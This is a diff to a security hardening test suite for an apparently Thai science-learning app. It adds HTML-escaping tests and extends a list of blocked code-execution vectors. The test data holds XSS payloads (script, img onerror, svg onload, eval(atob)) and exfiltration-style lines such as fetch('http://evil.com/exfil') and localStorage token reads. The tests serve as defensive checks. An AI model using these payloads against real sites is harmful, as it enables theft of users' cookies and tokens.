@@ -18,7 +18,12 @@ import { parseChemicalFormula } from './chemical-solver.ts';
 import { solveCircuit, type CircuitNetlist } from './circuit-solver.ts';
 import { evaluateCircuit, type LogicCircuit } from './logic-gate-engine.ts';
 import { evaluateAnswer, type ExerciseQuestion } from './exercise-bank.ts';
-import { safeTruncateThaiBytes, safeTruncateThaiGraphemes } from './utils.ts';
+import {
+  safeTruncateThaiBytes,
+  safeTruncateThaiGraphemes,
+  escapeHtml,
+  unescapeHtml,
+} from './utils.ts';
 
 describe('Security & Vulnerability Hardening Suite', () => {
   describe('1. Cross-Site Scripting (XSS) & KaTeX Injection Vectors', () => {
@@ -145,6 +150,12 @@ describe('Security & Vulnerability Hardening Suite', () => {
         'globalThis.secret = 42',
         'window.location = "http://evil.com"',
         'document.cookie',
+        'require("fs")',
+        'self.location = "http://evil.com"',
+        'top.location.href = "http://evil.com"',
+        'parent.postMessage("pwn", "*")',
+        'fetch("http://evil.com/exfil")',
+        'localStorage.getItem("token")',
       ];
 
       for (const expr of codeExecutionVectors) {
@@ -289,6 +300,60 @@ describe('Security & Vulnerability Hardening Suite', () => {
       const truncated = safeTruncateThaiGraphemes(mixed, 6);
       assert.ok(truncated.length > 0);
       assert.ok(!truncated.includes('\uFFFD'));
+    });
+  });
+
+  describe('4. HTML Entity Escaping & Injection Neutralization', () => {
+    it('escapes &, <, >, ", and \' characters properly into corresponding HTML entities', () => {
+      const raw = 'John & "Jane" <test@example.com> \'Admin\'';
+      const escaped = escapeHtml(raw);
+      assert.strictEqual(
+        escaped,
+        'John &amp; &quot;Jane&quot; &lt;test@example.com&gt; &#39;Admin&#39;'
+      );
+    });
+
+    it('neutralizes malicious HTML script, img, svg tags into unparsed entity text', () => {
+      const maliciousPayloads = [
+        '<script>alert("pwned")</script>',
+        '<img src="x" onerror="stealCookie()" />',
+        '<svg onload="alert(1)">',
+        '"><script>eval(atob("..."))</script>',
+        "test' onfocus='alert(1)'",
+      ];
+
+      for (const payload of maliciousPayloads) {
+        const escaped = escapeHtml(payload);
+        assert.ok(!escaped.includes('<'), `Must not retain raw < in: ${escaped}`);
+        assert.ok(!escaped.includes('>'), `Must not retain raw > in: ${escaped}`);
+        assert.ok(!escaped.includes('"'), `Must not retain raw " in: ${escaped}`);
+        assert.ok(!escaped.includes("'"), `Must not retain raw ' in: ${escaped}`);
+      }
+    });
+
+    it('roundtrips unescaping cleanly back to original strings', () => {
+      const original = '<div class="alert font-mono">2 & 3 > 4 & 5 < 6 \'ok\'</div>';
+      const escaped = escapeHtml(original);
+      const unescaped = unescapeHtml(escaped);
+      assert.strictEqual(unescaped, original);
+    });
+
+    it('safely preserves multilingual Thai text and scientific symbols without corruption', () => {
+      const thaiFormula = 'สมการเคมี: 2H₂ + O₂ -> 2H₂O (Δm = 0.0000 g/mol, λ = 500 nm, π ≈ 3.14159)';
+      const escaped = escapeHtml(thaiFormula);
+      assert.ok(escaped.includes('สมการเคมี'));
+      assert.ok(escaped.includes('Δm'));
+      assert.ok(escaped.includes('λ'));
+      assert.ok(escaped.includes('π'));
+      assert.strictEqual(unescapeHtml(escaped), thaiFormula);
+    });
+
+    it('handles empty, nullish, or invalid inputs safely without throwing', () => {
+      assert.strictEqual(escapeHtml(''), '');
+      assert.strictEqual(unescapeHtml(''), '');
+      assert.strictEqual(escapeHtml(null as unknown as string), '');
+      assert.strictEqual(unescapeHtml(undefined as unknown as string), '');
+      assert.strictEqual(escapeHtml(12345 as unknown as string), '');
     });
   });
 });
